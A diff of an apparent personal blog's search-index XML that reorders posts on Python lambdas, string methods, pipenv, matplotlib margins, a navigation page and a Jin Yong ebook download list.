       </categories>
       <tags>
         <tag>tools</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>金庸武侠小说大全-电子版下载</title>
-    <url>/2018/11/05/hero-novel/</url>
-    <content><![CDATA[<p><img src="https://i.loli.net/2018/11/05/5bdfe866de992.png" alt="cmd-markdown-logo"></br></p>
-<p>飞雪连天射白鹿，笑书神侠倚碧鸳，感谢查老带来的经典武侠作品，虽然没有读过几本，在大家读金庸的时候相同的时间我给了韩寒、苏童、王小波、路遥还有一系列的《电脑报》、《萌芽》、《Hacker X档案》 《黑客防线》等书籍，以下为整理的金庸武侠大全电子版，供大家下载：</p>
-<a id="more"></a>
-
-<blockquote>
-<ul>
-<li>《飞狐外传》</li>
-<li>《雪山飞狐》</li>
-<li>《连城诀》</li>
-<li>《天龙八部》</li>
-<li>《射雕英雄传》</li>
-<li>《白马啸西风》</li>
-<li>《鹿鼎记》</li>
-<li>《笑傲江湖》</li>
-<li>《书剑恩仇录》</li>
-<li>《神雕侠侣》</li>
-<li>《侠客行》</li>
-<li>《倚天屠龙记》</li>
-<li>《碧血剑》</li>
-<li>《鸳鸯刀》</li>
-<li>《越女剑》</li>
-</ul>
-</blockquote>
-<h3 id="电子书说明"><a href="#电子书说明" class="headerlink" title="电子书说明"></a>电子书说明<i class="icon-file"></i></h3><ul>
-<li><input checked="" disabled="" type="checkbox"> TXT版本 <a class="link"   href="https://yadi.sk/d/SXwMv1-tVMsqBQ"  target="_blank" rel="noopener">txt版本下载<i class="fas fa-external-link-alt"></i></a></li>
-<li><input checked="" disabled="" type="checkbox"> 插图版  <a class="link"   href="https://yadi.sk/d/SXwMv1-tVMsqBQ"  target="_blank" rel="noopener">插图版下载<i class="fas fa-external-link-alt"></i></a></li>
-<li><input checked="" disabled="" type="checkbox"> PDF三联 <a class="link"   href="https://yadi.sk/d/xKmKiwL5pNiQSg"  target="_blank" rel="noopener">PDF版下载<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>ebook</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>ebook,kindle,collect</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>lambda-function</title>
-    <url>/2020/05/16/lambda-function/</url>
-    <content><![CDATA[<p>Python: What is a Lambda Function?</p>
-<p>In Python ,the <strong>lambda</strong> keyword is used to define an anonymous(i.e.,nameless) function, using the follow syntax: </br></p>
-<a id="more"></a>
-<p><code>lambda parameters: expression</code></p>
-<p>Assunme we have the follow list of fruits:</p>
-<p><code>fruits = [&#39;apple&#39;,&#39;orange&#39;,&#39;grape&#39;,&#39;lemon&#39;,&#39;mango&#39;,&#39;banana&#39;]</code></p>
-<p>Now imagine we need to filter our list to print only fruit names which are 5 characters long.We could do so by defining a named function to test word lengths,and then passing it (and our list of fruits) to <strong>filter()</strong>:</br></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">five_letter_words</span><span class="hljs-params">(word)</span>:</span><br>    <span class="hljs-keyword">if</span> len(word) == <span class="hljs-number">5</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>five_letter_fruits = filter(five_letter_words,fruits)<br><br><span class="hljs-keyword">for</span> fruit <span class="hljs-keyword">in</span> five_letter_fruits:<br>  print(fruit)<br></code></pre></td></tr></table></figure>
-<p>Or, the same task can be accomeplished directly in <strong>filter()</strong> using <strong>lambda</strong> expression, without needing to define a separate named function:</br></p>
-<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver">five_letter_fruits = <span class="hljs-built_in">filter</span>(lambda <span class="hljs-built_in">word</span>:<span class="hljs-built_in">len</span>(<span class="hljs-built_in">word</span>)==<span class="hljs-number">5</span>,fruits)<br><span class="hljs-keyword">for</span> fruit <span class="hljs-keyword">in</span> five_letter_fruits:<br>  print(fruit)<br></code></pre></td></tr></table></figure>
-<p>Beacuse lambda functions are Python expressions, they can be assigned to variables.<br>So, this:</br></p>
-<figure class="highlight gml"><table><tr><td class="code"><pre><code class="hljs gml">add_two = lambda <span class="hljs-symbol">x</span>,<span class="hljs-symbol">y</span> <span class="hljs-symbol">x</span>+<span class="hljs-symbol">y</span><br>add_two(<span class="hljs-number">3</span>,<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>
-<p>Is equivalent to this:</p>
-<figure class="highlight gml"><table><tr><td class="code"><pre><code class="hljs gml">def add_two(<span class="hljs-symbol">x</span>,<span class="hljs-symbol">y</span>):<br>  <span class="hljs-keyword">return</span> <span class="hljs-symbol">x</span>+<span class="hljs-symbol">y</span><br>add_two(<span class="hljs-number">3</span>,<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>docs</category>
-        <category>python</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>matplotlib去除生成图片的白边</title>
-    <url>/2021/05/12/matplotlib-remove-edge/</url>
-    <content><![CDATA[<p>使用<code>matplotlib</code>中 <code>plt.savefig()</code>保存图片，图片四周有一圈空白，考虑到这是个重复使用比较高的功能，记录下来：</p>
-<ol>
-<li><p>首先需要关闭坐标轴显示</p>
-<p><code>plt.axis(&#39;off&#39;)</code> 这样透明的坐标轴仍然会占据左下角，导致图片偏右</p>
-<p>完全去除坐标轴显示需要添加下列配置</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">fig = plt.gcf()<br>fig.set_size_inches(<span class="hljs-number">7.0</span>/<span class="hljs-number">3</span>,<span class="hljs-number">7.0</span>/<span class="hljs-number">3</span>) <span class="hljs-comment">#输出图片大小和分辨率 700*700 dpi300</span><br></code></pre></td></tr></table></figure>
-</li>
-<li><p>去白边配置</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">plt.gca().xaxis.set_major_locator(plt.NullLocator())<br>plg.gca().yaxis.set_major_locator(plt.NullLocator())<br>plt.subplots_adjust(top =<span class="hljs-number">1</span>,bottom=<span class="hljs-number">0</span>,right=<span class="hljs-number">0</span>,hspace=<span class="hljs-number">0</span>,wspace=<span class="hljs-number">0</span>)<br>plt.margins(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>fig.savefig(out_png_path,format=<span class="hljs-string">'png'</span>,transparent=<span class="hljs-literal">True</span>,dip=<span class="hljs-number">300</span>,pad_inches=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
-
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>docs</category>
-        <category>python</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-        <tag>matplotlib</tag>
       </tags>
   </entry>
   <entry>
@@ -1651,6 +1578,23 @@ fire的使用非常简单，定义一个对象，剩下的交给fire来处理，
       </tags>
   </entry>
   <entry>
+    <title>导航页面</title>
+    <url>/2021/02/25/navigate-sites/</url>
+    <content><![CDATA[<p>  对经常访问的多个网址在保存书签后，由于习惯了chrome的使用环境，如果在别处登录还需要科学上网才能同步书签感觉比较麻烦，索性搭建一个静态的导航页。使用github pages的速度有时候也是受网络环境的影响比较大，刚好看到Vercal提供静态托管，免费版本够用了，而且速度挺快的。</p>
+<p>使用hugo搭建了一个，可以自定义域名。👍</p>
+<p>网址： <a class="link"   href="https://navi.yrzdm.com"  target="_blank" rel="noopener">navi.yrzdm.com<i class="fas fa-external-link-alt"></i></a></p>
+<p>即便想要从远程地址添加导航地址，也只需要从github里面直接修改就好，可以搭配action的自动配置，如果不想配置，从github中直接修改的话，也会立刻同步到vercal，这点还是非常方便的。</p>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>navigate</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>导航</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Markdown Awesome</title>
     <url>/2018/08/17/markdown-awesome/</url>
     <content><![CDATA[<p>`<head><br>    <script defer src="https://use.fontawesome.com/releases/v5.0.13/js/all.js"></script><br>    <script defer src="https://use.fontawesome.com/releases/v5.0.13/js/v4-shims.js"></script> </p>
@@ -1699,20 +1643,114 @@ fire的使用非常简单，定义一个对象，剩下的交给fire来处理，
       </tags>
   </entry>
   <entry>
-    <title>导航页面</title>
-    <url>/2021/02/25/navigate-sites/</url>
-    <content><![CDATA[<p>  对经常访问的多个网址在保存书签后，由于习惯了chrome的使用环境，如果在别处登录还需要科学上网才能同步书签感觉比较麻烦，索性搭建一个静态的导航页。使用github pages的速度有时候也是受网络环境的影响比较大，刚好看到Vercal提供静态托管，免费版本够用了，而且速度挺快的。</p>
-<p>使用hugo搭建了一个，可以自定义域名。👍</p>
-<p>网址： <a class="link"   href="https://navi.yrzdm.com"  target="_blank" rel="noopener">navi.yrzdm.com<i class="fas fa-external-link-alt"></i></a></p>
-<p>即便想要从远程地址添加导航地址，也只需要从github里面直接修改就好，可以搭配action的自动配置，如果不想配置，从github中直接修改的话，也会立刻同步到vercal，这点还是非常方便的。</p>
-]]></content>
+    <title>lambda-function</title>
+    <url>/2020/05/16/lambda-function/</url>
+    <content><![CDATA[<p>Python: What is a Lambda Function?</p>
+<p>In Python ,the <strong>lambda</strong> keyword is used to define an anonymous(i.e.,nameless) function, using the follow syntax: </br></p>
+<a id="more"></a>
+<p><code>lambda parameters: expression</code></p>
+<p>Assunme we have the follow list of fruits:</p>
+<p><code>fruits = [&#39;apple&#39;,&#39;orange&#39;,&#39;grape&#39;,&#39;lemon&#39;,&#39;mango&#39;,&#39;banana&#39;]</code></p>
+<p>Now imagine we need to filter our list to print only fruit names which are 5 characters long.We could do so by defining a named function to test word lengths,and then passing it (and our list of fruits) to <strong>filter()</strong>:</br></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">five_letter_words</span><span class="hljs-params">(word)</span>:</span><br>    <span class="hljs-keyword">if</span> len(word) == <span class="hljs-number">5</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>five_letter_fruits = filter(five_letter_words,fruits)<br><br><span class="hljs-keyword">for</span> fruit <span class="hljs-keyword">in</span> five_letter_fruits:<br>  print(fruit)<br></code></pre></td></tr></table></figure>
+<p>Or, the same task can be accomeplished directly in <strong>filter()</strong> using <strong>lambda</strong> expression, without needing to define a separate named function:</br></p>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver">five_letter_fruits = <span class="hljs-built_in">filter</span>(lambda <span class="hljs-built_in">word</span>:<span class="hljs-built_in">len</span>(<span class="hljs-built_in">word</span>)==<span class="hljs-number">5</span>,fruits)<br><span class="hljs-keyword">for</span> fruit <span class="hljs-keyword">in</span> five_letter_fruits:<br>  print(fruit)<br></code></pre></td></tr></table></figure>
+<p>Beacuse lambda functions are Python expressions, they can be assigned to variables.<br>So, this:</br></p>
+<figure class="highlight gml"><table><tr><td class="code"><pre><code class="hljs gml">add_two = lambda <span class="hljs-symbol">x</span>,<span class="hljs-symbol">y</span> <span class="hljs-symbol">x</span>+<span class="hljs-symbol">y</span><br>add_two(<span class="hljs-number">3</span>,<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>
+<p>Is equivalent to this:</p>
+<figure class="highlight gml"><table><tr><td class="code"><pre><code class="hljs gml">def add_two(<span class="hljs-symbol">x</span>,<span class="hljs-symbol">y</span>):<br>  <span class="hljs-keyword">return</span> <span class="hljs-symbol">x</span>+<span class="hljs-symbol">y</span><br>add_two(<span class="hljs-number">3</span>,<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>docs</category>
-        <category>navigate</category>
+        <category>python</category>
         <category>index</category>
       </categories>
       <tags>
-        <tag>导航</tag>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>金庸武侠小说大全-电子版下载</title>
+    <url>/2018/11/05/hero-novel/</url>
+    <content><![CDATA[<p><img src="https://i.loli.net/2018/11/05/5bdfe866de992.png" alt="cmd-markdown-logo"></br></p>
+<p>飞雪连天射白鹿，笑书神侠倚碧鸳，感谢查老带来的经典武侠作品，虽然没有读过几本，在大家读金庸的时候相同的时间我给了韩寒、苏童、王小波、路遥还有一系列的《电脑报》、《萌芽》、《Hacker X档案》 《黑客防线》等书籍，以下为整理的金庸武侠大全电子版，供大家下载：</p>
+<a id="more"></a>
+
+<blockquote>
+<ul>
+<li>《飞狐外传》</li>
+<li>《雪山飞狐》</li>
+<li>《连城诀》</li>
+<li>《天龙八部》</li>
+<li>《射雕英雄传》</li>
+<li>《白马啸西风》</li>
+<li>《鹿鼎记》</li>
+<li>《笑傲江湖》</li>
+<li>《书剑恩仇录》</li>
+<li>《神雕侠侣》</li>
+<li>《侠客行》</li>
+<li>《倚天屠龙记》</li>
+<li>《碧血剑》</li>
+<li>《鸳鸯刀》</li>
+<li>《越女剑》</li>
+</ul>
+</blockquote>
+<h3 id="电子书说明"><a href="#电子书说明" class="headerlink" title="电子书说明"></a>电子书说明<i class="icon-file"></i></h3><ul>
+<li><input checked="" disabled="" type="checkbox"> TXT版本 <a class="link"   href="https://yadi.sk/d/SXwMv1-tVMsqBQ"  target="_blank" rel="noopener">txt版本下载<i class="fas fa-external-link-alt"></i></a></li>
+<li><input checked="" disabled="" type="checkbox"> 插图版  <a class="link"   href="https://yadi.sk/d/SXwMv1-tVMsqBQ"  target="_blank" rel="noopener">插图版下载<i class="fas fa-external-link-alt"></i></a></li>
+<li><input checked="" disabled="" type="checkbox"> PDF三联 <a class="link"   href="https://yadi.sk/d/xKmKiwL5pNiQSg"  target="_blank" rel="noopener">PDF版下载<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>ebook</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>ebook,kindle,collect</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>old-string-formatting</title>
+    <url>/2018/03/01/old-string-formatting/</url>
+    <content><![CDATA[<h2 id="旧式字符串格式化"><a href="#旧式字符串格式化" class="headerlink" title="旧式字符串格式化"></a>旧式字符串格式化</h2><p>%操作符可以实现字符串格式化。它将左侧的参数作为类似sprintf()式的格式化字符串，而将右侧的代入，然后返回格式化后的字符串。</p>
+<p>for example:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">math<br>&gt;&gt;&gt;print(<span class="hljs-string">'The value of PI is approximately %5.3f.'</span> %math.pi)<br>The value of PI <span class="hljs-keyword">is</span> approximately <span class="hljs-number">3.142</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><br>For example.<br><span class="hljs-string">'The sum of 1 + 2 is 3'</span>str.format_map(mapping)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight xquery"><table><tr><td class="code"><pre><code class="hljs xquery"><br><span class="hljs-keyword">default</span>(dict):<br>      def __missing_<span class="hljs-number">_</span>(self<span class="hljs-built_in">,key</span>):<br>          <span class="hljs-keyword">return</span><span class="hljs-built_in"> key</span><br>          <br>  <span class="hljs-string">'&#123;name&#125; was born in &#123;country&#125;'</span>.format_map(<span class="hljs-keyword">default</span><span class="hljs-built_in">(name</span>=<span class="hljs-string">'Guido'</span>))<br><span class="hljs-string">'Guido war borin in country'</span><br></code></pre></td></tr></table></figure>
+
+<p>str.index(sub[,start[,end]])</p>
+<p>Like find(),but raise ValueError when the substring is not found.</p>
+<p>区别与find(),find的结果为False时返回-1，index()的查询值如果不在str中，则会报错。</p>
+<figure class="highlight less"><table><tr><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">changxufeng</span><span class="hljs-selector-class">.find</span>(<span class="hljs-string">'y'</span>)<span class="hljs-comment">//return -1</span><br><span class="hljs-selector-tag">changxufeng</span><span class="hljs-selector-class">.index</span>(<span class="hljs-string">'y'</span>)<span class="hljs-comment">// ValueError:substring not found</span><br></code></pre></td></tr></table></figure>
+
+<p>str.isalnum()</p>
+<p> Return true if all characters in the string are alphanumeric and there is at least one character,false otherwise. A character c is alphanumeric if one of the following returns True: c.isalpha(), c.isdecimal(), c.isdigit(), or c.isnumeric().</p>
+<p>如果都是字母和数字时候，return True, else return False.</p>
+<p>str.isalpha()</p>
+<p> Return true if all characters in the string are alphabetic and there is at least one character, false otherwise.Alphabetic characters are those characters defined in the Unicode character database as “Letter”,ie.e., those with general category property being one of “Lm”,”Lt”, “Lu”,”Ll” or “Lo” .Note that this is different from the “Alphabetic” propertty defined in the Unicode Standard.</p>
+<p>判断str是否都是数字</p>
+<p>str.isdecimal()</p>
+<p> Return true if all characters in the string are <strong>decimal</strong> characters and there is at least one character,false otherwise.Decimal characters are those from general catefory “Nd”. This category includes digit characters,and all characters that that can be used to form decimal-radix numbers,e.g. U+0660,ARABIC-INDIC DIGIT ZERO.</p>
+<p>判断str是否是十进制数。</p>
+<p>str.lstrip([<em>chars</em>])</p>
+<p>Return a copy of the string with leading characters removed. The <em>chars</em> argument is a string specifying the set of characters to be removed. If omitted or<code>None</code>, the <em>chars</em> argument defaults to removing whitespace. The <em>chars</em> argument is not a prefix; rather, all combinations of its values are stripped:</p>
+<p><code>&#39; changxufeng&#39;.lstrip()</code>\当argu为空是，返回结果为去掉str前面的空格。不影响原来str的值，只是一份copy</p>
+<p><code>&#39;changxufeng&#39;.lstrip(chang)</code>\return ‘xufeng’</p>
+<p>如果去掉首位的空格可以使用str.strip()</p>
+<p><code>&#39;changxufeng&#39;.rstrip(&#39;xufeng&#39;)</code>\return ‘cha’</p>
+<p>str.title()</p>
+<p> Return a titlecased version of the string where words start with an uppercase character and the remaining characters are lowercase.</p>
+<p> The algorithm uses a simple language-independent definition of a word as groups of consecutive letters. The definition works in many contexts but it means that apostrophes in contractions and possessives form word boundaries, which may not be the desired result:</p>
+<p>string中首字母大写。</p>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>python</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -1838,117 +1876,6 @@ fire的使用非常简单，定义一个对象，剩下的交给fire来处理，
       </categories>
       <tags>
         <tag>md5,bcrypt,hash,sha256,sha512,密码学,哈希算法,security</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>old-string-formatting</title>
-    <url>/2018/03/01/old-string-formatting/</url>
-    <content><![CDATA[<h2 id="旧式字符串格式化"><a href="#旧式字符串格式化" class="headerlink" title="旧式字符串格式化"></a>旧式字符串格式化</h2><p>%操作符可以实现字符串格式化。它将左侧的参数作为类似sprintf()式的格式化字符串，而将右侧的代入，然后返回格式化后的字符串。</p>
-<p>for example:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">math<br>&gt;&gt;&gt;print(<span class="hljs-string">'The value of PI is approximately %5.3f.'</span> %math.pi)<br>The value of PI <span class="hljs-keyword">is</span> approximately <span class="hljs-number">3.142</span><br></code></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><br>For example.<br><span class="hljs-string">'The sum of 1 + 2 is 3'</span>str.format_map(mapping)<br></code></pre></td></tr></table></figure>
-
-<figure class="highlight xquery"><table><tr><td class="code"><pre><code class="hljs xquery"><br><span class="hljs-keyword">default</span>(dict):<br>      def __missing_<span class="hljs-number">_</span>(self<span class="hljs-built_in">,key</span>):<br>          <span class="hljs-keyword">return</span><span class="hljs-built_in"> key</span><br>          <br>  <span class="hljs-string">'&#123;name&#125; was born in &#123;country&#125;'</span>.format_map(<span class="hljs-keyword">default</span><span class="hljs-built_in">(name</span>=<span class="hljs-string">'Guido'</span>))<br><span class="hljs-string">'Guido war borin in country'</span><br></code></pre></td></tr></table></figure>
-
-<p>str.index(sub[,start[,end]])</p>
-<p>Like find(),but raise ValueError when the substring is not found.</p>
-<p>区别与find(),find的结果为False时返回-1，index()的查询值如果不在str中，则会报错。</p>
-<figure class="highlight less"><table><tr><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">changxufeng</span><span class="hljs-selector-class">.find</span>(<span class="hljs-string">'y'</span>)<span class="hljs-comment">//return -1</span><br><span class="hljs-selector-tag">changxufeng</span><span class="hljs-selector-class">.index</span>(<span class="hljs-string">'y'</span>)<span class="hljs-comment">// ValueError:substring not found</span><br></code></pre></td></tr></table></figure>
-
-<p>str.isalnum()</p>
-<p> Return true if all characters in the string are alphanumeric and there is at least one character,false otherwise. A character c is alphanumeric if one of the following returns True: c.isalpha(), c.isdecimal(), c.isdigit(), or c.isnumeric().</p>
-<p>如果都是字母和数字时候，return True, else return False.</p>
-<p>str.isalpha()</p>
-<p> Return true if all characters in the string are alphabetic and there is at least one character, false otherwise.Alphabetic characters are those characters defined in the Unicode character database as “Letter”,ie.e., those with general category property being one of “Lm”,”Lt”, “Lu”,”Ll” or “Lo” .Note that this is different from the “Alphabetic” propertty defined in the Unicode Standard.</p>
-<p>判断str是否都是数字</p>
-<p>str.isdecimal()</p>
-<p> Return true if all characters in the string are <strong>decimal</strong> characters and there is at least one character,false otherwise.Decimal characters are those from general catefory “Nd”. This category includes digit characters,and all characters that that can be used to form decimal-radix numbers,e.g. U+0660,ARABIC-INDIC DIGIT ZERO.</p>
-<p>判断str是否是十进制数。</p>
-<p>str.lstrip([<em>chars</em>])</p>
-<p>Return a copy of the string with leading characters removed. The <em>chars</em> argument is a string specifying the set of characters to be removed. If omitted or<code>None</code>, the <em>chars</em> argument defaults to removing whitespace. The <em>chars</em> argument is not a prefix; rather, all combinations of its values are stripped:</p>
-<p><code>&#39; changxufeng&#39;.lstrip()</code>\当argu为空是，返回结果为去掉str前面的空格。不影响原来str的值，只是一份copy</p>
-<p><code>&#39;changxufeng&#39;.lstrip(chang)</code>\return ‘xufeng’</p>
-<p>如果去掉首位的空格可以使用str.strip()</p>
-<p><code>&#39;changxufeng&#39;.rstrip(&#39;xufeng&#39;)</code>\return ‘cha’</p>
-<p>str.title()</p>
-<p> Return a titlecased version of the string where words start with an uppercase character and the remaining characters are lowercase.</p>
-<p> The algorithm uses a simple language-independent definition of a word as groups of consecutive letters. The definition works in many contexts but it means that apostrophes in contractions and possessives form word boundaries, which may not be the desired result:</p>
-<p>string中首字母大写。</p>
-]]></content>
-      <categories>
-        <category>docs</category>
-        <category>python</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pipenv的使用整理</title>
-    <url>/2021/02/10/pipenv/</url>
-    <content><![CDATA[<p>pipenv 相当于virtualenv和pip的合体，使用起来更加方便。通过整合pip + virtualenv + Pipfile 能够自动处理好包的依赖问题和虚拟环境的问题。</p>
-<h3 id="安全，升级，卸载pipenv"><a href="#安全，升级，卸载pipenv" class="headerlink" title="安全，升级，卸载pipenv"></a>安全，升级，卸载pipenv</h3><ol>
-<li><p>安装</p>
-<p><code>pip install pipenv</code></p>
-</li>
-<li><p>升级</p>
-<p><code>pip install --upgrade pipenv</code></p>
-</li>
-<li><p>卸载</p>
-<p><code>pip uninstall pipenv</code></p>
-<p>这个没什么好讲，和普通的pip安装卸载方式一致。</p>
-</li>
-</ol>
-<h3 id="使用pipenv"><a href="#使用pipenv" class="headerlink" title="使用pipenv"></a>使用pipenv</h3><ol>
-<li><p>创建虚拟环境</p>
-<p><code>pipenv install</code></p>
-<p><code>pipenv install --three</code> 使用当前系统中Python3创建环境</p>
-<p><code>pipenv install --two</code> 使用当前系统中Python2创建环境</p>
-<p><code>pipenv --python 3.6</code> 指定使用某个版本的Python创建环境</p>
-<p><code>pipenv --python path</code> 使用指定路径的Python创建环境</p>
-</li>
-<li><p>激活并进入虚拟环境</p>
-<p><code>pipenv shell</code></p>
-</li>
-<li><p>运行python项目</p>
-<p><code>python xx.py</code></p>
-<p><code>pipenv run python xxx.py</code></p>
-</li>
-<li><p>在虚拟环境中安装模块，并加入到Pipfile。可以不进入虚拟环境，直接在项目目录下面使用pipenv安装。</p>
-<p><code>pipenv install requests</code></p>
-<p><code>pipenv install django==1.11</code></p>
-<p><code>pipenv uninstall requests</code></p>
-</li>
-<li><p>退出虚拟环境。</p>
-<p><code>exit</code></p>
-</li>
-<li><p>查看项目所在路径。</p>
-<p><code>pipenv --where</code></p>
-</li>
-<li><p>查看虚拟环境文件所在路径</p>
-<p><code>pipenv --venv</code></p>
-</li>
-<li><p>查看虚拟环境内安装的modules以及modules之间的依赖关系</p>
-<p><code>pipenv grapg</code></p>
-</li>
-<li><p>查找虚拟环境所有安装包</p>
-<p><code>pip list</code></p>
-</li>
-<li><p>导出虚拟环境内所有依赖的modules</p>
-<p><code>pip freeze &gt; requirements.txt</code></p>
-</li>
-<li><p>检查包的安全性</p>
-<p><code>pipenv check</code></p>
-</li>
-<li><p>删除当前虚拟环境。</p>
-<p><code>pipenv --rm</code></p>
-</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -2144,6 +2071,72 @@ fire的使用非常简单，定义一个对象，剩下的交给fire来处理，
       </tags>
   </entry>
   <entry>
+    <title>pipenv的使用整理</title>
+    <url>/2021/02/10/pipenv/</url>
+    <content><![CDATA[<p>pipenv 相当于virtualenv和pip的合体，使用起来更加方便。通过整合pip + virtualenv + Pipfile 能够自动处理好包的依赖问题和虚拟环境的问题。</p>
+<h3 id="安全，升级，卸载pipenv"><a href="#安全，升级，卸载pipenv" class="headerlink" title="安全，升级，卸载pipenv"></a>安全，升级，卸载pipenv</h3><ol>
+<li><p>安装</p>
+<p><code>pip install pipenv</code></p>
+</li>
+<li><p>升级</p>
+<p><code>pip install --upgrade pipenv</code></p>
+</li>
+<li><p>卸载</p>
+<p><code>pip uninstall pipenv</code></p>
+<p>这个没什么好讲，和普通的pip安装卸载方式一致。</p>
+</li>
+</ol>
+<h3 id="使用pipenv"><a href="#使用pipenv" class="headerlink" title="使用pipenv"></a>使用pipenv</h3><ol>
+<li><p>创建虚拟环境</p>
+<p><code>pipenv install</code></p>
+<p><code>pipenv install --three</code> 使用当前系统中Python3创建环境</p>
+<p><code>pipenv install --two</code> 使用当前系统中Python2创建环境</p>
+<p><code>pipenv --python 3.6</code> 指定使用某个版本的Python创建环境</p>
+<p><code>pipenv --python path</code> 使用指定路径的Python创建环境</p>
+</li>
+<li><p>激活并进入虚拟环境</p>
+<p><code>pipenv shell</code></p>
+</li>
+<li><p>运行python项目</p>
+<p><code>python xx.py</code></p>
+<p><code>pipenv run python xxx.py</code></p>
+</li>
+<li><p>在虚拟环境中安装模块，并加入到Pipfile。可以不进入虚拟环境，直接在项目目录下面使用pipenv安装。</p>
+<p><code>pipenv install requests</code></p>
+<p><code>pipenv install django==1.11</code></p>
+<p><code>pipenv uninstall requests</code></p>
+</li>
+<li><p>退出虚拟环境。</p>
+<p><code>exit</code></p>
+</li>
+<li><p>查看项目所在路径。</p>
+<p><code>pipenv --where</code></p>
+</li>
+<li><p>查看虚拟环境文件所在路径</p>
+<p><code>pipenv --venv</code></p>
+</li>
+<li><p>查看虚拟环境内安装的modules以及modules之间的依赖关系</p>
+<p><code>pipenv grapg</code></p>
+</li>
+<li><p>查找虚拟环境所有安装包</p>
+<p><code>pip list</code></p>
+</li>
+<li><p>导出虚拟环境内所有依赖的modules</p>
+<p><code>pip freeze &gt; requirements.txt</code></p>
+</li>
+<li><p>检查包的安全性</p>
+<p><code>pipenv check</code></p>
+</li>
+<li><p>删除当前虚拟环境。</p>
+<p><code>pipenv --rm</code></p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python-analytics</title>
     <url>/2016/09/08/python-analytics/</url>
     <content><![CDATA[<p>最近小红说要买个二手房，让我帮忙看一下二手房的信息，嗯毕竟买房是个麻烦事，而近一个月济南房价真是<strong>涨疯</strong>了。</p>
@@ -2171,283 +2164,6 @@ fire的使用非常简单，定义一个对象，剩下的交给fire来处理，
       </categories>
       <tags>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python-map-reduce</title>
-    <url>/2016/09/26/python-map-reduce/</url>
-    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200229/yeRGwfwD44nt.png?imageslim" alt="mark"><br>在Python里内建了Map和Reduce 函数，一开始怎么也看不明白，看图识也不明白。</p>
-<a id="more"></a>
-
-<p>直到看了”MapReduce:Simplified Data Processing on Large Clusters” <a class="link"   href="https://www.cs.utexas.edu/~pingali/CS395T/2012sp/lectures/MR-nikhil-panpalia.pdf"  target="_blank" rel="noopener">link<i class="fas fa-external-link-alt"></i></a>（面向大型集群的简化数据处理）这个论文来自GOOGLE.<br><img src="http://www.liaoxuefeng.com/files/attachments/0013879622109990efbf9d781704b02994ba96765595f56000/0" alt="MAP"><br>Map(映射)Reduce(化简)<br>MapRedce 既是一种编程模型，也是一种与之关联的、用于处理和产生大数据集的实现。用户要特化一个map程序去处理key/value对，并产生中间key/value对的集合，以及一个Reduce程序去合并有着相同key的所有中间key/value对。</p>
-<p>用这种函数风格写出的程序自动就拥有了在一个大的PC机集群上并执行的能力。运行时系统会负责细节：切分输入数据，在一组机器上调度执行程序，处理机器错误，以及管理所需的机器间通信。这允许不具备任何并行和分布式系统经验的程序员也能轻松地利用一个大型分布式系统的资源。<br>我们的MapReduce实现运行在一个大型PC机集群上，且具有很好的扩展性：一个典型的MapReduce作业运行在Google的集群上。<br><strong>编程模型</strong><br>计算过程就是输入一组key/value对，再生成一组key/value对。MapReduce库的使用者用两个函数来表示这个过程：map和reduce。</p>
